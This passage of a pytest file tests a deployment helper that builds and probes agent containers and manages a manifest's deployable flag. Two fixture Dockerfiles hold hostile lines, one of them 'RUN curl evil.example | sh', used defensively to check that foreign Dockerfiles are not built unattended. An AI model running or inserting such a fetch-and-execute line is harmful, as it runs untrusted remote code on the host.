    assert report.outcome == md.OUTCOME_VERIFICATION_FAILED
    # The claim never reaches disk.
    manifest = (recipe / "manifest.yaml").read_text()
    assert "deployable: true" not in manifest


def test_passing_verification_flags_the_manifest(recipe: Path, monkeypatch):
    report, _ = _run_with_docker(
        recipe,
        monkeypatch,
        state=md.DOCKER_USABLE,
        lock_ok=True,
        verified=True,
    )
    assert report.outcome == md.OUTCOME_DEPLOYABLE_VERIFIED
    assert "deployable: true" in (recipe / "manifest.yaml").read_text()


def test_stale_lockfile_defers_the_flag_and_never_builds(
    recipe: Path, monkeypatch
):
    """The sequencing trap: building here fails for an unrelated reason."""
    report, seen = _run_with_docker(
        recipe,
        monkeypatch,
        state=md.DOCKER_USABLE,
        lock_ok=False,
        verified=True,
    )
    assert not seen["verified"], "must not build against a stale lockfile"
    verify = next(c for c in report.checks if c.id == "container-verify")
    assert verify.status == md.NEEDS_INPUT
    assert "uv lock" in verify.message
    manifest = next(c for c in report.checks if c.id == "manifest-deployable")
    assert manifest.status == md.NEEDS_INPUT
    assert "deployable: true" not in (recipe / "manifest.yaml").read_text()


@pytest.mark.parametrize("state", [md.DOCKER_ABSENT, md.DOCKER_UNREACHABLE])
def test_no_docker_skips_cleanly_and_still_flags(
    recipe: Path, monkeypatch, state
):
    """The primary user has no container runtime. That must not regress."""
    report, seen = _run_with_docker(
        recipe, monkeypatch, state=state, lock_ok=True, verified=True
    )
    assert not seen["verified"]
    assert report.outcome == md.OUTCOME_DEPLOYABLE_UNVERIFIED
    # Absence of evidence is not evidence of absence: the flag is still set.
    assert "deployable: true" in (recipe / "manifest.yaml").read_text()
    # And nothing anywhere calls it a failure.
    assert not any(c.status == md.ERROR for c in report.checks)


def test_verification_not_requested_never_touches_docker(
    recipe: Path, monkeypatch
):
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    monkeypatch.setattr(
        md, "detect_docker", lambda: (md.DOCKER_USABLE, "stubbed")
    )

    def explode(**kwargs):
        raise AssertionError("must not verify unless asked")

    monkeypatch.setattr(md, "verify_container", explode)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert report.outcome == md.OUTCOME_DEPLOYABLE_UNVERIFIED


def test_dry_run_never_builds_even_when_asked(recipe: Path, monkeypatch):
    """Verification needs the files on disk, so it cannot run in dry-run."""
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    monkeypatch.setattr(
        md, "detect_docker", lambda: (md.DOCKER_USABLE, "stubbed")
    )

    def explode(**kwargs):
        raise AssertionError("must not verify during a dry run")

    monkeypatch.setattr(md, "verify_container", explode)
    report = md.run(
        recipe_dir=recipe,
        apply=False,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
        verify_container_requested=True,
    )
    verify = next(c for c in report.checks if c.id == "container-verify")
    assert "only runs with --apply" in verify.message


# ---------------------------------------------------------------------------
# The unavailable path, for real
#
# Mocks prove the branch; these prove the actual binary-detection code against
# a real process. The skill's primary user runs exactly this path, so it is
# worth spending two subprocesses on.
# ---------------------------------------------------------------------------

SCRIPT = Path(__file__).parent.parent / "scripts" / "make_deployable.py"

MINIMAL_POLICY = """
deployability:
  min_google_adk: "2.6.0"
  adk_major_migration_is_manual: true
  required_dependencies:
    - "google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0"
  required_files:
    - Dockerfile
    - "<pkg>/fast_api_app.py"
  emit_agents_cli_manifest: false
  legacy_app_utils_files:
    - telemetry.py
  verification:
    probe_port: 8080
    run_allowlist: []
"""


@pytest.fixture
def standalone_repo(recipe: Path) -> Path:
    """The recipe fixture plus the .github/policy.yml the script walks up to."""
    write(recipe / ".github" / "policy.yml", MINIMAL_POLICY)
    return recipe


def _run_script(recipe: Path, env: dict[str, str], *args) -> dict:
    proc = subprocess.run(
        [sys.executable, str(SCRIPT), "--recipe-dir", str(recipe), *args],
        capture_output=True,
        text=True,
        timeout=120,
        env={**os.environ, **env},
        check=False,
    )
    assert proc.returncode == 0, (
        f"unavailable docker must exit 0, got {proc.returncode}: "
        f"{proc.stderr[-500:]}"
    )
    return json.loads(proc.stdout)


def test_real_run_with_no_docker_on_path(standalone_repo: Path, tmp_path: Path):
    """No container runtime at all — the common case. Must skip, not fail."""
    empty_bin = tmp_path / "empty-bin"
    empty_bin.mkdir()
    report = _run_script(standalone_repo, {"PATH": str(empty_bin)})

    docker = next(c for c in report["checks"] if c["id"] == "docker")
    assert docker["details"]["docker_state"] == md.DOCKER_ABSENT
    assert docker["status"] == md.REPORT_ONLY
    assert report["outcome"] == md.OUTCOME_DEPLOYABLE_UNVERIFIED
    assert not any(c["status"] == md.ERROR for c in report["checks"])


def test_real_run_with_an_unreachable_daemon(
    standalone_repo: Path, tmp_path: Path
):
    """A docker binary that cannot reach its daemon: also a skip, not an error.

    The dead daemon is a STUB on PATH, not a real docker CLI aimed at a bad
    socket with DOCKER_HOST. That earlier mechanism tested the CLI's own
    host-vs-context precedence as much as it tested this script, and that is
    not portable: the same call resolved to `unreachable` on Docker 29.6.1
    locally and to `usable` on the CI runner, which broke the build. What
    this test is actually about is what the script does when `docker info`
    fails, so it creates that condition directly instead of asking a real
    docker to produce it.
    """
    fake_bin = tmp_path / "fake-docker-bin"
    fake_bin.mkdir()
    stub = fake_bin / "docker"
    stub.write_text(
        "#!/bin/sh\n"
        "echo 'Cannot connect to the Docker daemon at "
        "unix:///var/run/docker.sock. Is the docker daemon running?' >&2\n"
        "exit 1\n"
    )
    stub.chmod(0o755)
    # PREPEND rather than replace: only `docker` is shadowed, so the script
    # can still find uv and anything else it shells out to.
    report = _run_script(
        standalone_repo,
        {"PATH": f"{fake_bin}{os.pathsep}{os.environ.get('PATH', '')}"},
    )

    docker = next(c for c in report["checks"] if c["id"] == "docker")
    assert docker["details"]["docker_state"] == md.DOCKER_UNREACHABLE
    assert docker["status"] == md.REPORT_ONLY
    assert "not a failure" in docker["message"]
    # Proves the stub was found AND its failure was read, rather than the run
    # quietly taking the `absent` path and passing for the wrong reason.
    assert "Cannot connect to the Docker daemon" in docker["message"]
    assert not any(c["status"] == md.ERROR for c in report["checks"])


# ---------------------------------------------------------------------------
# Regression tests for defects found by independent review
#
# Each of these failed before its fix. They are the cheapest possible guard on
# the feature's central promise: a recipe that cannot serve must never end up
# flagged deployable.
# ---------------------------------------------------------------------------


def test_container_that_will_not_start_is_not_verified(
    tmp_path: Path, monkeypatch
):
    """`docker run` failing must return False, never True.

    Untested before, and flipping this branch to `return True` left the whole
    suite green while writing `deployable: true` for a container that never
    started.
    """
    fake = FakeDocker(
        {"run": (125, "", "OCI runtime create failed: exec: no such file")}
    )
    monkeypatch.setattr(md, "_docker", fake)
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=True,
        report=report,
    )

    assert result is False
    serves = next(c for c in report.checks if c.id == "container-serves")
    assert serves.status == md.ERROR
    assert "would not start" in serves.message


def test_unpublished_port_is_not_verified(tmp_path: Path, monkeypatch):
    """No published port means we cannot probe, which is not a pass."""
    fake = FakeDocker({"port": (0, "", "")})  # empty `docker port` output
    monkeypatch.setattr(md, "_docker", fake)
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=True,
        report=report,
    )

    assert result is False
    serves = next(c for c in report.checks if c.id == "container-serves")
    assert "not published" in serves.message


def test_failed_verification_retracts_a_stale_deployable_flag(
    recipe: Path, monkeypatch
):
    """The headline defect: declining to WRITE the flag is not enough.

    Ordinary sequence — an earlier run with no docker writes `deployable:
    true` on static checks alone; a later run with docker proves the container
    broken. Before the fix the report said "NOT set" while the manifest on
    disk still said true, so the report lied and the false claim shipped.
    """
    (recipe / "manifest.yaml").write_text(
        "type: standalone\nlanguage: python\ndeployable: true\n",
        encoding="utf-8",
    )
    report, _ = _run_with_docker(
        recipe,
        monkeypatch,
        state=md.DOCKER_USABLE,
        lock_ok=True,
        verified=False,
    )
    assert report.outcome == md.OUTCOME_VERIFICATION_FAILED
    text = (recipe / "manifest.yaml").read_text()
    assert "deployable: true" not in text, "a disproved claim was left on disk"
    # And the other keys survive the surgical removal.
    assert "type: standalone" in text
    assert "language: python" in text


def test_probe_paths_substitute_the_agent_package(tmp_path: Path, monkeypatch):
    """`<pkg>` substitution was executed but never asserted.

    Break it and every recipe reports "A2A wiring did NOT take effect", which
    reads as a real finding about the recipe rather than a bug in the checker.
    """
    seen: list[str] = []
    fake = FakeDocker({"port": (0, "127.0.0.1:54321\n", "")})
    monkeypatch.setattr(md, "_docker", fake)

    def record(url, timeout=10):
        seen.append(url)
        return 200, "ok"

    monkeypatch.setattr(md, "_probe", record)
    md.verify_container(
        recipe_dir=tmp_path,
        package="financial_advisor",
        settings=SETTINGS,
        may_run=True,
        report=md.Report(recipe_dir=str(tmp_path), mode="apply"),
    )
    assert any("/a2a/financial_advisor/" in u for u in seen), seen
    assert not any("<pkg>" in u for u in seen), seen


def test_build_hint_ignores_echoed_dockerfile_instructions():
    """BuildKit echoes every instruction, so naive substring matching lies.

    A network failure used to be reported as "uv.lock does not match
    pyproject.toml" purely because the echoed `RUN uv sync --frozen` line
    contained the word frozen.
    """
    buildkit_noise = (
        " => [2/5] RUN pip install --no-cache-dir uv==0.8.13\n"
        " => [3/5] COPY ./pyproject.toml ./README.md ./uv.lock* ./\n"
        " => [5/5] RUN uv sync --frozen\n"
        "failed to solve: failed to fetch oauth token: "
        "Temporary failure in name resolution\n"
    )
    proc = subprocess.CompletedProcess(
        args=[], returncode=1, stdout="", stderr=buildkit_noise
    )
    hint = md._build_failure_hint(proc)
    assert "uv.lock does not match" not in hint
    assert "README" not in hint
    assert "network" in hint.lower()


def test_foreign_dockerfile_is_not_built_unattended(recipe: Path, monkeypatch):
    """`docker build` executes RUN, so a Dockerfile we did not write is code
    execution and needs the same allowlist the run step has."""
    (recipe / "Dockerfile").write_text(
        "FROM python:3.11-slim\nRUN echo pwned\n", encoding="utf-8"
    )

    def explode(**kwargs):
        raise AssertionError("must not build a foreign Dockerfile")

    monkeypatch.setattr(md, "verify_container", explode)
    report, _ = _run_with_docker(
        recipe,
        monkeypatch,
        state=md.DOCKER_USABLE,
        lock_ok=True,
        verified=True,
    )
    verify = next(c for c in report.checks if c.id == "container-verify")
    assert "not the one this skill generated" in verify.message


def test_missing_app_object_blocks_the_deployable_flag(
    recipe: Path, monkeypatch
):
    """The generated entrypoint imports `app`; without it nothing can start."""
    (recipe / "app" / "agent.py").write_text(
        "x = 1\n", encoding="utf-8"
    )  # no root_agent
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert "deployable: true" not in (recipe / "manifest.yaml").read_text()


def test_crash_after_writing_does_not_claim_a_clean_no_op(
    recipe: Path, monkeypatch
):
    """`blocked` means nothing was written. It must not be reported when six
    files are already on disk."""
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)

    def boom(*a, **k):
        raise PermissionError("read-only filesystem")

    monkeypatch.setattr(md, "patch_manifest_deployable", boom)
    report = md.Report(recipe_dir=str(recipe), mode="apply")
    with pytest.raises(PermissionError):
        md.run(
            recipe_dir=recipe,
            apply=True,
            overwrite=False,
            data_dirs=[],
            region="us-east1",
            report=report,
        )
    # The caller owns the report, so the partial work survives the exception.
    assert report.files_written, "files were written but the report forgot"


# ---------------------------------------------------------------------------
# Helpers with no coverage before review
# ---------------------------------------------------------------------------


def test_parse_env_example_handles_real_world_lines(tmp_path: Path):
    write(
        tmp_path / ".env.example",
        """
        # a comment
        GOOGLE_CLOUD_PROJECT=<TODO: update-this-value>
        MODEL_NAME=gemini-flash-latest  # trailing comment
        QUOTED="with quotes"
        URL=postgres://u:p@h/db?a=1&b=2
        not a pair
        LOWER_case_9=ok
        """,
    )
    env = md.parse_env_example(tmp_path / ".env.example")
    assert env["MODEL_NAME"] == "gemini-flash-latest"
    assert env["QUOTED"] == "with quotes"
    # A value containing '=' must survive intact.
    assert env["URL"] == "postgres://u:p@h/db?a=1&b=2"
    assert "not a pair" not in env
    assert env["LOWER_case_9"] == "ok"


def test_parse_env_example_missing_file_is_empty(tmp_path: Path):
    assert md.parse_env_example(tmp_path / "nope.env") == {}


def test_parse_host_port_prefers_ipv4_on_dual_stack():
    """We bind and probe over IPv4; taking line one blindly picks [::]."""
    assert md._parse_host_port("[::]:49155\n0.0.0.0:54321\n") == "54321"
    assert md._parse_host_port("0.0.0.0:54321\n[::]:49155\n") == "54321"
    assert md._parse_host_port("[::]:49155\n") == "49155"


def test_generated_dockerfile_is_recognised_across_invocations(
    recipe: Path, monkeypatch
):
    """Phase two must not mistake phase one's own output for a foreign file.

    Recognising it by "did THIS invocation write it" broke the normal
    two-phase flow: verification would be skipped for every recipe not on the
    allowlist, silently disabling the feature.
    """
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    templates = (
        Path(md.__file__).resolve().parent.parent / "resources" / "templates"
    )
    # Phase one: generate.
    md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert (recipe / "Dockerfile").is_file()
    # Phase two: a fresh invocation must still recognise it as ours.
    assert md.dockerfile_is_generated(
        recipe_dir=recipe,
        templates_dir=templates,
        package="app",
        project_name="demo-recipe",
        python_version="3.11",
        data_dirs=[],
    )


def test_bespoke_dockerfile_is_not_recognised_as_generated(recipe: Path):
    templates = (
        Path(md.__file__).resolve().parent.parent / "resources" / "templates"
    )
    (recipe / "Dockerfile").write_text(
        "FROM python:3.11-slim\nRUN curl evil.example | sh\n", encoding="utf-8"
    )
    assert not md.dockerfile_is_generated(
        recipe_dir=recipe,
        templates_dir=templates,
        package="app",
        project_name="demo-recipe",
        python_version="3.11",
        data_dirs=[],
    )


# ---------------------------------------------------------------------------
# Environmental failure is NOT a verdict
#
# The retraction added above deletes a line from a contributor's manifest. It
# must therefore fire only on evidence about the RECIPE. A DNS blip or a
# leftover container holding the port says nothing about the recipe, and
# deleting their flag over it is data loss caused by our own machine.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "stderr",
    [
        "failed to solve: Temporary failure in name resolution",
        "failed to fetch oauth token: timeout",
        "toomanyrequests: rate limit exceeded",
        "no space left on device",
    ],
)
def test_environmental_build_failure_is_inconclusive(
    tmp_path: Path, monkeypatch, stderr
):
    fake = FakeDocker({"build": (1, "", stderr)})
    monkeypatch.setattr(md, "_docker", fake)
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=True,
        report=report,
    )

    # None, not False: no verdict, so nothing is retracted.
    assert result is None
    build = next(c for c in report.checks if c.id == "container-build")
    assert build.status == md.REPORT_ONLY
    assert build.details["environmental"] is True


def test_port_clash_does_not_condemn_the_recipe(tmp_path: Path, monkeypatch):
    """A leftover container holding the port is our mess, not theirs."""
    fake = FakeDocker({"run": (125, "", "port is already allocated")})
    monkeypatch.setattr(md, "_docker", fake)
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")
    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=True,
        report=report,
    )
    assert result is None


def test_network_failure_does_not_delete_a_contributors_flag(
    recipe: Path, monkeypatch
):
    """End to end: the manifest must survive an environmental failure."""
    (recipe / "manifest.yaml").write_text(
        "type: standalone\nlanguage: python\ndeployable: true\n",
        encoding="utf-8",
    )
    report, _ = _run_with_docker(
        recipe,
        monkeypatch,
        state=md.DOCKER_USABLE,
        lock_ok=True,
        verified=None,  # inconclusive
    )
    assert "deployable: true" in (recipe / "manifest.yaml").read_text()
    assert report.outcome == md.OUTCOME_DEPLOYABLE_UNVERIFIED


def test_broken_app_object_also_retracts_a_stale_flag(
    recipe: Path, monkeypatch
):
    """The more broken recipe must not keep the flag the less broken one loses.

    Ordering the app-object branch before the retraction meant a recipe with
    BOTH no root_agent and a failed container kept its stale `deployable:
    true`.
    """
    (recipe / "manifest.yaml").write_text(
        "type: standalone\nlanguage: python\ndeployable: true\n",
        encoding="utf-8",
    )
    (recipe / "app" / "agent.py").write_text("x = 1\n", encoding="utf-8")
    report, _ = _run_with_docker(
        recipe,
        monkeypatch,
        state=md.DOCKER_USABLE,
        lock_ok=True,
        verified=False,
    )
    assert "deployable: true" not in (recipe / "manifest.yaml").read_text()
    assert report.outcome == md.OUTCOME_VERIFICATION_FAILED


def test_crlf_manifest_is_not_rewritten_wholesale(tmp_path: Path):
    """A one-line removal must not become an every-line diff on Windows."""
    m = tmp_path / "manifest.yaml"
    m.write_bytes(b"name: demo\r\ntype: standalone\r\ndeployable: true\r\n")
    md.clear_manifest_deployable(m, apply=True)
    assert m.read_bytes() == b"name: demo\r\ntype: standalone\r\n"


def test_non_scalar_deployable_is_left_alone(tmp_path: Path):
    """Deleting only the first line would splice the body onto the prior key."""
    m = tmp_path / "manifest.yaml"
    original = "name: demo\ndeployable:\n  reason: complicated\n"
    m.write_text(original, encoding="utf-8")
    check = md.clear_manifest_deployable(m, apply=True)
    assert m.read_text() == original, "off-schema document was corrupted"
    assert "REVIEW IT BY HAND" in check.message


def test_empty_required_files_is_an_error_not_a_no_op(
    recipe: Path, monkeypatch
):
    """An empty policy list must not silently generate nothing and pass."""
    policy = _policy()
    policy["required_files"] = []
    monkeypatch.setattr(md, "load_policy", lambda _root: policy)
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert any(c.status == md.ERROR for c in report.checks)
    assert "deployable: true" not in (recipe / "manifest.yaml").read_text()


def test_required_files_cannot_escape_the_recipe(recipe: Path, monkeypatch):
    """`..` in a policy entry must not write into a sibling recipe."""
    policy = _policy()
    policy["required_files"] = ["../../ESCAPED.md"]
    monkeypatch.setattr(md, "load_policy", lambda _root: policy)
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert not (recipe.parent.parent / "ESCAPED.md").exists()


def test_crash_forces_a_blocked_outcome(recipe: Path, monkeypatch):
    """A crash must never leave a success outcome for a caller to switch on.

    Driven in-process against the real main() exception path. The earlier
    version spawned a subprocess, monkeypatched only the parent, and asserted
    `returncode in (0, 2)` — which every possible run satisfies.
    """
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)

    def boom(*a, **k):
        raise RuntimeError("disk on fire")

    monkeypatch.setattr(md, "patch_manifest_deployable", boom)
    monkeypatch.setattr(
        sys,
        "argv",
        ["make_deployable.py", "--recipe-dir", str(recipe), "--apply"],
    )
    printed: list[str] = []
    monkeypatch.setattr("builtins.print", lambda *a, **k: printed.append(a[0]))

    rc = md.main()

    assert rc == 2, "a crash must exit 2"
    envelope = json.loads(printed[-1])
    assert envelope["outcome"] == md.OUTCOME_BLOCKED
    assert envelope["files_written"], "partial work must survive the crash"
    assert any("CRASHED" in n for n in envelope["notes"])


@pytest.mark.parametrize(
    "log",
    [
        "Failed to build async-timeout==4.0.3",
        "No solution found: pytest-timeout==2.3.1 has no wheels",
        "E   Failed: Timeout >60.0s",
    ],
)
def test_recipe_faults_naming_timeout_are_not_excused(log):
    """`async-timeout` is a transitive dep in most lockfiles here.

    A bare `timeout` substring match excused genuine build failures as
    environmental, so a proven-broken recipe kept `deployable: true` and the
    run exited 0 — the original bug, from the opposite direction.
    """
    proc = subprocess.CompletedProcess(
        args=[], returncode=1, stdout="", stderr=log
    )
    assert md.failure_is_environmental(proc) is False


@pytest.mark.parametrize(
    "log",
    [
        "failed to solve: Temporary failure in name resolution",
        "failed to fetch oauth token: dial tcp: i/o timeout",
        "toomanyrequests: rate limit exceeded",
        "docker build timed out after 900s",
    ],
)
def test_real_infrastructure_failures_are_still_excused(log):
    proc = subprocess.CompletedProcess(
        args=[], returncode=1, stdout="", stderr=log
    )
    assert md.failure_is_environmental(proc) is True


def test_container_answering_non_200_forever_is_a_verdict(
    tmp_path: Path, monkeypatch
):
    """Running is not the same as healthy.

    A bespoke entrypoint left in place without --overwrite 404s /list-apps.
    Treating "alive but never 200" as inconclusive let it keep the flag.
    """
    fake = FakeDocker(
        {"port": (0, "127.0.0.1:54321\n", ""), "inspect": (0, "true\n", "")}
    )
    monkeypatch.setattr(md, "_docker", fake)
    monkeypatch.setattr(md, "_probe", lambda url, timeout=10: (404, "nope"))
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings={**SETTINGS, "ready_timeout_seconds": 1},
        may_run=True,
        report=report,
    )

    assert result is False, "a server that never returns 200 is not a pass"
    serves = next(c for c in report.checks if c.id == "container-serves")
    assert serves.status == md.ERROR


def test_silent_container_is_still_inconclusive(tmp_path: Path, monkeypatch):
    """No HTTP response at all could just be a loaded host — no verdict."""
    fake = FakeDocker(
        {"port": (0, "127.0.0.1:54321\n", ""), "inspect": (0, "true\n", "")}
    )
    monkeypatch.setattr(md, "_docker", fake)
    monkeypatch.setattr(md, "_probe", lambda url, timeout=10: (0, "refused"))
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings={**SETTINGS, "ready_timeout_seconds": 1},
        may_run=True,
        report=report,
    )
    assert result is None


def test_outcome_and_manifest_never_contradict_each_other(
    recipe: Path, monkeypatch
):
    """An ERROR must not yield `deployable-verified` beside a deleted flag."""
    policy = _policy()
    policy["required_files"] = ["<pkg>/does_not_exist.py"]
    monkeypatch.setattr(md, "load_policy", lambda _root: policy)
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    monkeypatch.setattr(
        md, "detect_docker", lambda: (md.DOCKER_USABLE, "stubbed")
    )
    monkeypatch.setattr(
        md, "lockfile_is_current", lambda *a, **k: (True, "stubbed")
    )
    monkeypatch.setattr(md, "verify_container", lambda **kw: True)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
        verify_container_requested=True,
    )
    assert report.outcome != md.OUTCOME_DEPLOYABLE_VERIFIED
    assert "deployable: true" not in (recipe / "manifest.yaml").read_text()


def test_deferral_does_not_shield_an_already_disqualified_recipe(
    recipe: Path, monkeypatch
):
    """Phase one is ALWAYS the stale-lockfile path, so this was the normal
    way a disqualified recipe kept a false flag."""
    (recipe / "manifest.yaml").write_text(
        "type: standalone\nlanguage: python\ndeployable: true\n",
        encoding="utf-8",
    )
    (recipe / "app" / "agent.py").write_text("x = 1\n", encoding="utf-8")
    _run_with_docker(
        recipe,
        monkeypatch,
        state=md.DOCKER_USABLE,
        lock_ok=False,  # deferral path
        verified=True,
    )
    assert "deployable: true" not in (recipe / "manifest.yaml").read_text()


def test_attempted_but_inconclusive_says_so(recipe: Path, monkeypatch):
    """Don't advise someone to run the thing they just ran."""
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    monkeypatch.setattr(
        md, "detect_docker", lambda: (md.DOCKER_USABLE, "stubbed")
    )
    monkeypatch.setattr(
        md, "lockfile_is_current", lambda *a, **k: (True, "stubbed")
    )

    def env_failure(**kwargs):
        kwargs["report"].add(
            md.Check(
                id="container-build",
                status=md.REPORT_ONLY,
                message="dns",
                details={"environmental": True},
            )
        )

    monkeypatch.setattr(md, "verify_container", env_failure)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
        verify_container_requested=True,
    )
    joined = " ".join(report.notes)
    assert "ATTEMPTED but reached no verdict" in joined
    assert "nobody has yet built the image" not in joined


def test_clean_build_only_run_is_not_called_inconclusive(
    recipe: Path, monkeypatch
):
    """A successful build-only run on a non-allowlisted recipe is a RESULT.

    Telling that owner to "re-run when the environment is healthy" is advice
    to repeat a run that succeeded and will never change.
    """
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    monkeypatch.setattr(
        md, "detect_docker", lambda: (md.DOCKER_USABLE, "stubbed")
    )
    monkeypatch.setattr(
        md, "lockfile_is_current", lambda *a, **k: (True, "stubbed")
    )

    def build_only(**kwargs):
        kwargs["report"].add(
            md.Check(
                id="container-build",
                status=md.CLEAN,
                message="Image built.",
            )
        )

    monkeypatch.setattr(md, "verify_container", build_only)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
        verify_container_requested=True,
    )
    assert "ATTEMPTED but reached no verdict" not in " ".join(report.notes)


def test_skill_fault_leaves_the_manifest_exactly_as_found(
    recipe: Path, monkeypatch
):
    """Our packaging bug must not destroy a contributor's assertion."""
    (recipe / "manifest.yaml").write_text(
        "type: standalone\nlanguage: python\ndeployable: true\n",
        encoding="utf-8",
    )
    before = (recipe / "manifest.yaml").read_text()
    policy = _policy()
    policy["required_files"] = ["<pkg>/template_nobody_vendored.py"]
    monkeypatch.setattr(md, "load_policy", lambda _root: policy)
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    # Neither set nor retracted: the run learned nothing about the recipe.
    assert (recipe / "manifest.yaml").read_text() == before
    assert report.outcome == md.OUTCOME_BLOCKED
    assert any(c.details.get(md.SKILL_FAULT) for c in report.checks), (
        "the fault must be attributed to the skill, not the recipe"
    )


def test_late_manifest_error_is_reflected_in_the_outcome(
    recipe: Path, monkeypatch
):
    """patch_manifest_deployable runs last; its ERROR must still count."""
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    (recipe / "manifest.yaml").write_text("{{ not yaml", encoding="utf-8")
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert report.outcome != md.OUTCOME_DEPLOYABLE_UNVERIFIED


# ---------------------------------------------------------------------------
# adk-locked-version must not misdescribe how uv lock behaves
#
# uv is STICKY: it preserves an already-locked version that still satisfies
# the declared specifier. The check used to promise the opposite, and
# rag-agent-search is what that cost — locked at 2.3.0 under `>=2.0.0`,
# re-locked exactly as instructed, still 2.3.0, and the container then died
# on `cannot import name 'TextPart' from 'a2a.types'`.
# ---------------------------------------------------------------------------


def test_below_floor_does_not_promise_a_plain_relock_will_fix_it(
    tmp_path: Path,
):
    write(
        tmp_path / "uv.lock",
        '[[package]]\nname = "google-adk"\nversion = "2.3.0"\n',
    )
    check = md.check_adk_locked_version(tmp_path / "uv.lock", MIN_ADK)

    assert check.status == md.REPORT_ONLY
    # The false promise, in the phrasings it could plausibly regress to.
    assert "will raise" not in check.message
    assert "re-locking will" not in check.message
    # And the accurate, actionable remedy.
    assert "WILL NOT RAISE IT" in check.message
    assert check.details["remedy"] == "uv lock --upgrade-package google-adk"


def test_below_floor_todo_gives_the_upgrade_command(recipe: Path, monkeypatch):
    """A plain `uv lock` here is a no-op; the todo must not recommend it.

    The specifier must still ADMIT the locked version, which is what makes uv
    sticky. With a `>=2.6.0` specifier and a 2.3.0 lock the lockfile is merely
    stale and a plain re-lock does raise it — a different situation entirely.
    """
    pyproject = recipe / "pyproject.toml"
    pyproject.write_text(
        pyproject.read_text().replace(
            '"google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0",',
            '"google-adk[gcp,otel-gcp]>=2.0.0,<3.0.0",',
        ),
        encoding="utf-8",
    )
    (recipe / "uv.lock").write_text(
        '[[package]]\nname = "google-adk"\nversion = "2.3.0"\n',
        encoding="utf-8",
    )
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=False,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    lock_todos = [t for t in report.todos if "uv lock" in t]
    assert lock_todos, "expected a lockfile todo"
    assert any("--upgrade-package google-adk" in t for t in lock_todos)
    # The plain form must not be offered as the fix for this recipe.
    assert not any(
        t.startswith("Run `uv lock --python 3.11`") for t in lock_todos
    )


def test_at_or_above_floor_still_gets_the_plain_lock_todo(
    recipe: Path, monkeypatch
):
    """The upgrade advice must not leak onto recipes that don't need it."""
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=False,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert any(
        t.startswith("Run `uv lock --python 3.11`") for t in report.todos
    )
    assert not any("--upgrade-package" in t for t in report.todos)


def _declare_all_required(recipe: Path, policy: dict, *, extras=True) -> None:
    """Rewrite the fixture's deps so every required package is present."""
    pyproject = recipe / "pyproject.toml"
    specs = [
        s if extras else s.replace("[gcp,otel-gcp]", "")
        for s in policy["required_dependencies"]
    ]
    pyproject.write_text(
        pyproject.read_text().replace(
